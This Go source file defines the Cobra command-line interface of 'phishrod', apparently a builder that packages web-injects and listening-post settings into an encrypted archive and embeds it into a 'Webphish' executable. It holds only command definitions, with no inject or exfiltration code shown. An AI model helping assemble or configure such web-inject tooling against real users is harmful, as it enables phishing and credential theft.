package cmd

import (
	"fmt"
	"github.com/spf13/cobra"
	"os"
)

var rootCmd = &cobra.Command{
	Use:   "phishrod",
	Short: "PhishRod integrates user web-inject and server configuration into the Webphish client",
}

var packageCmd = &cobra.Command{
	Use:   "package",
	Short: `Packages web-injections, resource-matching configuration, and listening-post configuration into encrypted archive ready for embedding`,
	Run:   buildPackage,
}

var unpackCmd = &cobra.Command{
	Use:   "unpack",
	Short: `Unpacks web-injections, resource-matching configuration, and listening-post configuration from encrypted archive`,
	Run:   unpackArchive,
}

var embedCmd = &cobra.Command{
	Use:   "embed",
	Short: "Embeds an encrypted archive into a Webphish executable",
	Run:   embedResource,
}

var downloadCmd = &cobra.Command{
	Use:   "download",
	Short: "Downloads the latest Webphish (unconfigured)",
}

func init() {

	rootCmd.AddCommand(embedCmd)
	rootCmd.AddCommand(downloadCmd)
	rootCmd.AddCommand(packageCmd)
	rootCmd.AddCommand(unpackCmd)
}

func Execute() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
